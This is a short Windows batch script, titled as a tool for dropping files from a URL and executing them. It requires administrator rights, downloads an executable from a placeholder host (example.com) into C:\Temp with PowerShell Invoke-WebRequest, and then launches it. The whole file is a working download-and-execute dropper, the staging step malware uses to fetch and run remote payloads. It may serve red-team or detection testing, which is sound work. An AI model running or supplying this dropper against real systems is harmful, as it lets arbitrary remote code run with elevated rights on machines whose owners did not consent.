@echo off
Title Dropping files to system using URL and executing them
Color A 
net session nul> 2>&1
if %errorlevel% neq 0 (
   echo "Please execute this script under administrator rights"
   pause
   exit /b 
   )
:: Define the URL and the drop location
set "url=https://example.com/file.exe"
set "dropLocation=C:\Temp\dropped_file.exe"

:: Create the drop location folder if it doesn't exist
if not exist C:\Temp (
    mkdir C:\Temp
)

:: Use PowerShell to download the file
:: Uses Invoke Webrequest 
echo Downloading file from the Internet...
powershell -Command "Invoke-WebRequest -Uri %url% -OutFile %dropLocation%"

:: Check if the file was downloaded, if its downloaded it will executed 
if exist %dropLocation% (
    echo File downloaded successfully.
    echo Executing the file...
    start %dropLocation%
) else (
    echo Failed to download the file.
)

pause
exit 